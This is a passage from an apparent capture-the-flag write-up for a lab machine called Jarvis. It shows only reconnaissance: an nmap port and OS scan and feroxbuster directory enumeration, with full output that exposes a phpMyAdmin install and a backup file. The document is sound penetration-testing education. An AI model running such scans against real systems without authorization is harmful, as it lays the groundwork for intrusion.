
**Target:** `10.129.229.137` · **Date:** 24–25/06/2026

```bash
>  echo "10.129.229.137 jarvis.htb" | sudo tee -a /etc/hosts
10.129.229.137 jarvis.htb
>  sudo nmap -sC -sV -Pn -O -T4 --min-rate=3000 -p- 10.129.229.137
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-24 23:51 +0200
Warning: 10.129.229.137 giving up on port because retransmission cap hit (6).
Nmap scan report for jarvis.htb (10.129.229.137)
Host is up (0.12s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA)
|   256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 (ECDSA)
|_  256 77:d4:ae:1f:b0:be:15:1f:f8:cd:c8:15:3a:c3:69:e1 (ED25519)
80/tcp    open     http    Apache httpd 2.4.25 ((Debian))
|_http-title: Stark Hotel
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.25 (Debian)
51270/tcp filtered unknown
64999/tcp open     http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn't have a title (text/html).
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.99%E=4%D=6/24%OT=22%CT=1%CU=36068%PV=Y%DS=2%DC=I%G=Y%TM=6A3C51A
OS:A%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=8)SEQ
OS:(SP=108%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=8)SEQ(SP=FA%GCD=1%ISR=110%TI=Z%C
OS:I=Z%II=I%TS=8)SEQ(SP=FB%GCD=1%ISR=105%TI=Z%CI=Z%II=I%TS=8)SEQ(SP=FD%GCD=
OS:1%ISR=104%TI=Z%CI=Z%TS=8)OPS(O1=M552ST11NW7%O2=M552ST11NW7%O3=M552NNT11N
OS:W7%O4=M552ST11NW7%O5=M552ST11NW7%O6=M552ST11)WIN(W1=7120%W2=7120%W3=7120
OS:%W4=7120%W5=7120%W6=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M552NNSNW7%CC=Y%Q=)T
OS:1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0
OS:%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6
OS:(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=16
OS:4%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 81.00 seconds
```

We have `ssh 22/tcp` and `http 80/tcp` open. The `http` server runs per `64999/tcp` on `Apache httpd 2.4.25` on `Debian`.

`http-title: Stark Hotel` gives us the title of the website, when we browse to the IP address we're redirected towards a Hotel bookup website.

We find information on the bottom of the webpage :

`[supersecurehotel@logger.htb](http://jarvis.htb/rooms-suites.php#)
`[supersecurehotel.htb](http://jarvis.htb/rooms-suites.php`

We'll add that to the hosts next to `jarvis.htb` and we got an email address as well.

`10.129.229.137 jarvis.htb supersecurehotel.htb`

We might want to fuzz domains and directories :

```bash
>  feroxbuster -u http://supersecurehotel.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt  
                                                                                                                                                                                                                    
___  ___  __   __     __      __         __   ___  
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__  
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___  
by Ben "epi" Risher 🤓                 ver: 2.13.1  
───────────────────────────┬──────────────────────  
🎯  Target Url            │ http://supersecurehotel.htb/  
🚩  In-Scope Url          │ supersecurehotel.htb  
🚀  Threads               │ 50  
📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt  
👌  Status Codes          │ All Status Codes!  
💥  Timeout (secs)        │ 7  
🦡  User-Agent            │ feroxbuster/2.13.1  
🔎  Extract Links         │ true  
🏁  HTTP methods          │ [GET]  
🔃  Recursion Depth       │ 4  
───────────────────────────┴──────────────────────  
🏁  Press [ENTER] to use the Scan Management Menu™  
──────────────────────────────────────────────────  
404      GET        9l       31w      282c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter  
403      GET        9l       28w      285c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter  
301      GET        9l       28w      325c http://supersecurehotel.htb/js => http://supersecurehotel.htb/js/  
301      GET        9l       28w      329c http://supersecurehotel.htb/images => http://supersecurehotel.htb/images/  
301      GET        9l       28w      326c http://supersecurehotel.htb/css => http://supersecurehotel.htb/css/  
200      GET      205l     1368w     8111c http://supersecurehotel.htb/js/jquery.easing.1.3.js  
200      GET        4l      317w    15413c http://supersecurehotel.htb/js/modernizr-2.6.2.min.js  
200      GET        5l      150w    22342c http://supersecurehotel.htb/js/jquery.flexslider-min.js  
200      GET        2l      276w    40401c http://supersecurehotel.htb/js/owl.carousel.min.js  
200      GET      543l     1653w    23628c http://supersecurehotel.htb/index.php  
200      GET        4l      224w    20932c http://supersecurehotel.htb/js/jquery.magnific-popup.min.js  
200      GET      130l      782w    64595c http://supersecurehotel.htb/images/menu-9.jpg  
200      GET       35l       80w      972c http://supersecurehotel.htb/fonts/flaticon/font/flaticon.css  
200      GET      258l     1722w   145650c http://supersecurehotel.htb/images/room-1.jpg  
200      GET      237l     1489w   125548c http://supersecurehotel.htb/images/room-3.jpg  
200      GET       55l      169w     1410c http://supersecurehotel.htb/js/magnific-popup-options.js  
200      GET      368l      876w     7781c http://supersecurehotel.htb/css/magnific-popup.css  
200      GET        7l      152w     8835c http://supersecurehotel.htb/js/jquery.waypoints.min.js  
200      GET      372l     1701w   151284c http://supersecurehotel.htb/images/room-6.jpg  
200      GET      272l      674w     9304c http://supersecurehotel.htb/dining-bar.php  
200      GET        7l      430w    36816c http://supersecurehotel.htb/js/bootstrap.min.js  
200      GET      196l     1118w    93493c http://supersecurehotel.htb/images/menu-2.jpg  
200      GET     1628l     4730w    46275c http://supersecurehotel.htb/css/style.css  
200      GET     1671l     4509w    46821c http://supersecurehotel.htb/js/bootstrap-datepicker.js  
200      GET     2334l     3908w    35786c http://supersecurehotel.htb/css/icomoon.css  
200      GET     6257l    14923w   134656c http://supersecurehotel.htb/css/bootstrap.css  
200      GET      308l     1963w   165172c http://supersecurehotel.htb/images/room-2.jpg  
200      GET        1l        1w      680c http://supersecurehotel.htb/fonts/flaticon/backup.txt  
200      GET        5l     1307w    84380c http://supersecurehotel.htb/js/jquery.min.js  
200      GET       54l      255w     4864c http://supersecurehotel.htb/fonts/flaticon/font/Flaticon.ttf  
200      GET      405l     2081w    60555c http://supersecurehotel.htb/fonts/flaticon/license/license.pdf  
301      GET        9l       28w      328c http://supersecurehotel.htb/fonts => http://supersecurehotel.htb/fonts/  
301      GET        9l       28w      333c http://supersecurehotel.htb/phpmyadmin => http://supersecurehotel.htb/phpmyadmin/  
200      GET       52l      123w     2315c http://supersecurehotel.htb/css/owl.theme.default.min.css  
200      GET      286l      482w     6117c http://supersecurehotel.htb/js/main.js  
302      GET      101l      231w     3024c http://supersecurehotel.htb/room.php => index.php  
200      GET        1l       82w     3630c http://supersecurehotel.htb/css/owl.carousel.min.css  
200      GET      275l      703w     6864c http://supersecurehotel.htb/css/flexslider.css  
200      GET      292l      840w    11849c http://supersecurehotel.htb/rooms-suites.php  
200      GET        6l       69w     4378c http://supersecurehotel.htb/js/respond.min.js  
200      GET       49l      172w     2678c http://supersecurehotel.htb/js/google_map.js  
200      GET      130l      681w    52554c http://supersecurehotel.htb/images/menu-8.jpg  
200      GET       10l       64w     3079c http://supersecurehotel.htb/images/loc.png  
200      GET      512l     1690w    17946c http://supersecurehotel.htb/css/bootstrap-datepicker.css  
200      GET      106l      587w    35387c http://supersecurehotel.htb/fonts/bootstrap/glyphicons-halflings-regular.eot  
200      GET       73l      429w    32536c http://supersecurehotel.htb/fonts/bootstrap/glyphicons-halflings-regular.woff2  
200      GET       94l      534w    42816c http://supersecurehotel.htb/fonts/bootstrap/glyphicons-halflings-regular.woff  
200      GET      184l     1161w    91250c http://supersecurehotel.htb/images/room-4.jpg  
200      GET      114l      788w    72363c http://supersecurehotel.htb/images/menu-4.jpg  
200      GET      135l      776w    71987c http://supersecurehotel.htb/images/menu-3.jpg  
200      GET      138l      805w    72175c http://supersecurehotel.htb/images/menu-1.jpg  
200      GET     1947l     4190w    73008c http://supersecurehotel.htb/css/animate.css  
200      GET      543l     1653w    23628c http://supersecurehotel.htb/  
200      GET        9l       78w     5382c http://supersecurehotel.htb/fonts/flaticon/font/Flaticon.woff  
200      GET       47l       98w     1280c http://supersecurehotel.htb/fonts/flaticon/font/_flaticon.scss  
200      GET       54l      258w     5048c http://supersecurehotel.htb/fonts/flaticon/font/Flaticon.eot  
200      GET        7l       12w    27181c http://supersecurehotel.htb/css/style.css.map  
200      GET      772l     1723w    58132c http://supersecurehotel.htb/fonts/bootstrap/glyphicons-halflings-regular.ttf  
200      GET      256l     1327w   118351c http://supersecurehotel.htb/images/menu-7.jpg  
200      GET      179l      878w    73643c http://supersecurehotel.htb/images/menu-5.jpg  
200      GET      215l     1359w   111330c http://supersecurehotel.htb/images/blog-2.jpg  
200      GET      132l     2213w    23381c http://supersecurehotel.htb/fonts/flaticon/font/Flaticon.svg  
200      GET      475l     1103w    17856c http://supersecurehotel.htb/fonts/flaticon/font/flaticon.html  
200      GET      251l     1479w   117871c http://supersecurehotel.htb/images/amenities-1.jpg  
200      GET      172l      414w    89411c http://supersecurehotel.htb/images/loader.gif  
200      GET        7l       12w    76082c http://supersecurehotel.htb/css/bootstrap.css.map  
301      GET        9l       28w      337c http://supersecurehotel.htb/phpmyadmin/tmp => http://supersecurehotel.htb/phpmyadmin/tmp/  
301      GET        9l       28w      343c http://supersecurehotel.htb/phpmyadmin/libraries => http://supersecurehotel.htb/phpmyadmin/libraries/  
200      GET      350l     1992w   186368c http://supersecurehotel.htb/images/amenities-2.jpg  
200      GET      425l     2318w   208928c http://supersecurehotel.htb/images/blog-3.jpg  
200      GET      319l     1799w   172775c http://supersecurehotel.htb/images/amenities-3.jpg  
200      GET      151l      917w    79720c http://supersecurehotel.htb/images/menu-6.jpg  
200      GET      288l    13959w   108738c http://supersecurehotel.htb/fonts/bootstrap/glyphicons-halflings-regular.svg  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/tbl_columns_definition_form.inc.php  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/mysql_relations.inc.php  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/vendor_config.php  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/config.default.php  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/special_schema_links.inc.php  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/error.inc.php  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/tbl_common.inc.php  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/config.values.php  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/mult_submits.inc.php  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/user_preferences.inc.php  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/db_table_exists.inc.php  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/server_common.inc.php  
200      GET      311l     1704w   159080c http://supersecurehotel.htb/images/room-5.jpg  
200      GET      293l     1998w   170022c http://supersecurehotel.htb/images/blog-1.jpg  
200      GET      304l     1706w   124633c http://supersecurehotel.htb/images/person1.jpg  
200      GET       22l       58w      676c http://supersecurehotel.htb/phpmyadmin/templates/header_location.twig  
200      GET       16l       59w      507c http://supersecurehotel.htb/phpmyadmin/templates/theme_preview.twig  
200      GET        1l        1w       53c http://supersecurehotel.htb/phpmyadmin/themes/dot.gif  
200      GET        8l       25w      305c http://supersecurehotel.htb/phpmyadmin/templates/filter.twig  
200      GET       20l       33w      615c http://supersecurehotel.htb/phpmyadmin/themes/svg_gradient.php  
200      GET      327l     1797w   154229c http://supersecurehotel.htb/images/person2.jpg  
301      GET        9l       28w      343c http://supersecurehotel.htb/phpmyadmin/templates => http://supersecurehotel.htb/phpmyadmin/templates/  
301      GET        9l       28w      340c http://supersecurehotel.htb/phpmyadmin/themes => http://supersecurehotel.htb/phpmyadmin/themes/  
200      GET        6l       42w      389c http://supersecurehotel.htb/phpmyadmin/templates/select_all.twig  
200      GET       11l       61w      401c http://supersecurehotel.htb/phpmyadmin/templates/radio_fields.twig  
200      GET        6l       18w      150c http://supersecurehotel.htb/phpmyadmin/templates/secondary_tabs.twig  
200      GET       32l       80w      874c http://supersecurehotel.htb/phpmyadmin/templates/select_lang.twig  
200      GET       20l       72w      794c http://supersecurehotel.htb/phpmyadmin/templates/start_and_number_of_rows_panel.twig  
200      GET       12l       54w      480c http://supersecurehotel.htb/phpmyadmin/templates/prefs_twofactor_confirm.twig  
200      GET       11l       72w      502c http://supersecurehotel.htb/phpmyadmin/templates/dropdown.twig  
200      GET        4l       23w      218c http://supersecurehotel.htb/phpmyadmin/templates/fk_checkbox.twig  
200      GET        6l       53w      369c http://supersecurehotel.htb/phpmyadmin/templates/checkbox.twig  
200      GET       15l       74w      702c http://supersecurehotel.htb/phpmyadmin/templates/prefs_autoload.twig  
200      GET       24l       67w     1023c http://supersecurehotel.htb/phpmyadmin/templates/toggle_button.twig  
200      GET       13l       38w      368c http://supersecurehotel.htb/phpmyadmin/templates/prefs_twofactor_configure.twig  
200      GET       11l       41w      309c http://supersecurehotel.htb/phpmyadmin/templates/preview_sql.twig  
200      GET      452l     4052w    26563c http://supersecurehotel.htb/phpmyadmin/libraries/advisory_rules.txt  
200      GET      438l     2553w   218982c http://supersecurehotel.htb/images/person3.jpg  
200      GET     1219l     9397w   231436c http://supersecurehotel.htb/fonts/icomoon/icomoon.ttf  
200      GET      394l     1561w    14721c http://supersecurehotel.htb/phpmyadmin/js/gis_data_editor.js  
200      GET        9l       28w      289c http://supersecurehotel.htb/phpmyadmin/js/export_output.js  
200      GET        1l        5w       37c http://supersecurehotel.htb/phpmyadmin/js/whitelist.php  
200      GET       70l      178w     2009c http://supersecurehotel.htb/phpmyadmin/js/server_status_sorter.js  
200      GET       59l      142w     1749c http://supersecurehotel.htb/phpmyadmin/js/page_settings.js  
200      GET      110l      279w     4127c http://supersecurehotel.htb/phpmyadmin/js/server_variables.js  
200      GET      309l      882w    10112c http://supersecurehotel.htb/phpmyadmin/js/error_report.js  
200      GET      413l     1204w    15807c http://supersecurehotel.htb/phpmyadmin/js/tbl_select.js  
200      GET       14l       60w      471c http://supersecurehotel.htb/phpmyadmin/js/cross_framing_protection.js  
200      GET       79l      208w     2198c http://supersecurehotel.htb/phpmyadmin/js/db_qbe.js  
200      GET      222l      789w     8318c http://supersecurehotel.htb/phpmyadmin/js/menu-resizer.js  
200      GET      729l     1893w    27248c http://supersecurehotel.htb/phpmyadmin/js/normalization.js  
200      GET       92l      211w     3154c http://supersecurehotel.htb/phpmyadmin/js/replication.js  
200      GET      365l     1160w    10949c http://supersecurehotel.htb/phpmyadmin/js/tbl_gis_visualization.js  
200      GET       51l       55w     3167c http://supersecurehotel.htb/phpmyadmin/libraries/certs/cacert.pem  
200      GET       20l       22w     1200c http://supersecurehotel.htb/phpmyadmin/libraries/certs/12d55845.0  
200      GET      409l     3083w    30285c http://supersecurehotel.htb/phpmyadmin/js/messages.php  
200      GET      550l     1782w    19168c http://supersecurehotel.htb/phpmyadmin/js/common.js  
200      GET      427l     1442w    15803c http://supersecurehotel.htb/phpmyadmin/js/db_structure.js  
200      GET      708l     2663w    29012c http://supersecurehotel.htb/phpmyadmin/js/tbl_change.js  
200      GET      758l     2353w    27409c http://supersecurehotel.htb/phpmyadmin/js/indexes.js  
200      GET      503l     1520w    19866c http://supersecurehotel.htb/phpmyadmin/js/tbl_structure.js  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/themes/pmahomme/layout.inc.php  
200      GET        2l        6w       32c http://supersecurehotel.htb/phpmyadmin/templates/test/add_data.twig  
200      GET        1l        2w       14c http://supersecurehotel.htb/phpmyadmin/templates/test/static.twig  
200      GET        1l        3w       16c http://supersecurehotel.htb/phpmyadmin/templates/test/echo.twig  
200      GET       25l       81w     1020c http://supersecurehotel.htb/phpmyadmin/templates/console/bookmark_content.twig  
200      GET      253l      746w    10191c http://supersecurehotel.htb/phpmyadmin/js/db_multi_table_query.js  
200      GET      834l     5305w   456161c http://supersecurehotel.htb/images/img_bg_2.jpg  
200      GET      335l     1342w    11594c http://supersecurehotel.htb/phpmyadmin/js/microhistory.js  
200      GET       10l       39w      331c http://supersecurehotel.htb/phpmyadmin/templates/console/toolbar.twig  
200      GET      187l      568w     6122c http://supersecurehotel.htb/phpmyadmin/js/server_status_processes.js  
200      GET       14l       45w      527c http://supersecurehotel.htb/phpmyadmin/templates/privileges/require_options.twig  
200      GET       24l       77w      902c http://supersecurehotel.htb/phpmyadmin/templates/privileges/initials_row.twig  
200      GET       94l      293w     3581c http://supersecurehotel.htb/phpmyadmin/js/db_tracking.js  
200      GET      219l      482w     8627c http://supersecurehotel.htb/phpmyadmin/templates/table/index_form.twig  
200      GET       17l       42w      564c http://supersecurehotel.htb/phpmyadmin/templates/table/secondary_tabs.twig  
200      GET       17l       68w      763c http://supersecurehotel.htb/phpmyadmin/templates/columns_definitions/mime_type.twig  
200      GET      180l      539w     7825c http://supersecurehotel.htb/phpmyadmin/templates/columns_definitions/partitions.twig  
200      GET       31l       96w      959c http://supersecurehotel.htb/phpmyadmin/templates/columns_definitions/column_virtuality.twig  
200      GET        9l       41w      423c http://supersecurehotel.htb/phpmyadmin/templates/columns_definitions/transformation_option.twig  
200      GET        7l       28w      293c http://supersecurehotel.htb/phpmyadmin/templates/columns_definitions/column_auto_increment.twig  
200      GET        7l       29w      287c http://supersecurehotel.htb/phpmyadmin/templates/columns_definitions/column_extra.twig  
200      GET        7l       21w      218c http://supersecurehotel.htb/phpmyadmin/templates/columns_definitions/column_comment.twig  
200      GET       21l      111w      909c http://supersecurehotel.htb/phpmyadmin/templates/columns_definitions/column_attribute.twig  
200      GET       43l      164w     1503c http://supersecurehotel.htb/phpmyadmin/templates/columns_definitions/column_name.twig  
200      GET       11l       40w      404c http://supersecurehotel.htb/phpmyadmin/templates/columns_definitions/column_length.twig  
200      GET      152l      410w     6075c http://supersecurehotel.htb/phpmyadmin/templates/columns_definitions/column_definitions_form.twig  
200      GET        7l       24w      178c http://supersecurehotel.htb/phpmyadmin/templates/login/twofactor.twig  
200      GET      323l      989w    14117c http://supersecurehotel.htb/phpmyadmin/js/tbl_operations.js  
200      GET       23l       70w      866c http://supersecurehotel.htb/phpmyadmin/templates/database/create_table.twig  
200      GET       15l       65w      631c http://supersecurehotel.htb/phpmyadmin/templates/columns_definitions/move_column.twig  
200      GET     1219l     9398w   231616c http://supersecurehotel.htb/fonts/icomoon/icomoon.eot  
200      GET      866l     2681w    26929c http://supersecurehotel.htb/phpmyadmin/js/config.js  
200      GET     1077l     4006w    47678c http://supersecurehotel.htb/phpmyadmin/js/rte.js  
200      GET     1654l     4936w    59816c http://supersecurehotel.htb/phpmyadmin/js/navigation.js  
200      GET       91l      493w    45201c http://supersecurehotel.htb/phpmyadmin/themes/pmahomme/screen.png  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/Core.php  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/LanguageManager.php  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/Advisor.php  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/Logging.php  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/Encoding.php  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/ReplicationGui.php  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/Console.php  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/Language.php  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/Relation.php  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/ErrorHandler.php  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/SysInfoBase.php  
500      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/Error.php  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/Header.php  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/Types.php  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/Url.php  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/Config.php  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/TwoFactor.php  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/Normalization.php  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/ParseAnalyze.php  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/Index.php  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/CheckUserPrivileges.php  
500      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/SysInfoLinux.php  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/VersionInformation.php  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/Replication.php  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/ZipExtension.php  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/Mime.php  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/ListAbstract.php  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/Export.php  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/CreateAddField.php  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/Charsets.php  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/UserPassword.php  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/FileListing.php  
200      GET      165l      478w     3886c http://supersecurehotel.htb/phpmyadmin/js/vendor/js.cookie.js  
500      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/Partition.php  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/Transformations.php  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/Font.php  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/RelationCleanup.php  
500      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/IpAllowDeny.php  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/SqlQueryForm.php  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/CentralColumns.php  
200      GET     1277l     5005w    45389c http://supersecurehotel.htb/phpmyadmin/js/vendor/tracekit.js  
200      GET      211l      951w     7387c http://supersecurehotel.htb/phpmyadmin/js/vendor/sprintf.js  
500      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/Import.php  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/RecentFavoriteTable.php  
301      GET        9l       28w      337c http://supersecurehotel.htb/phpmyadmin/doc => http://supersecurehotel.htb/phpmyadmin/doc/  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/Sql.php  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/StorageEngine.php  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/Scripts.php  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/Response.php  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/Message.php  
500      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/SysInfoWINNT.php  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/Tracker.php  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/UserPreferences.php  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/Menu.php  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/SysInfo.php  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/Template.php  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/Tracking.php  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/Operations.php  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/Table.php  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/Linter.php  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/DatabaseInterface.php  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/hash.lib.php  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/Sanitize.php  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/OutputBuffering.php  
200      GET        1l        2w       14c http://supersecurehotel.htb/phpmyadmin/libraries/common.inc.php  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/SystemDatabase.php  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/BrowseForeigners.php  
500      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/Pdf.php  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/ErrorReport.php  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/SubPartition.php  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/db_common.inc.php  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/IndexColumn.php  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/Plugins.php  
500      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/SysInfoSunOS.php  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/File.php  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/MultSubmits.php  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/InsertEdit.php  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/Theme.php  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/SavedSearches.php  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/Util.php  
500      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/ListDatabase.php  
200      GET       67l      146w     2003c http://supersecurehotel.htb/phpmyadmin/js/designer/init.js  
200      GET       15l       46w      386c http://supersecurehotel.htb/phpmyadmin/js/designer/objects.js  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/Bookmark.php  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/Footer.php  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/check_user_privileges.inc.php  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/OpenDocument.php  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/Session.php  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/ThemeManager.php  
200      GET      136l      376w     4311c http://supersecurehotel.htb/phpmyadmin/js/designer/database.js  
200      GET      160l      491w     5373c http://supersecurehotel.htb/phpmyadmin/js/designer/page.js  
200      GET      754l     2382w    22367c http://supersecurehotel.htb/phpmyadmin/js/vendor/u2f-api-polyfill.js  
200      GET     5107l    16854w   173349c http://supersecurehotel.htb/phpmyadmin/js/functions.js  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/information_schema_relations.inc.php  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/language_stats.inc.php  
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/replication.inc.php  
200      GET      855l     3121w    28527c http://supersecurehotel.htb/phpmyadmin/js/designer/history.js  
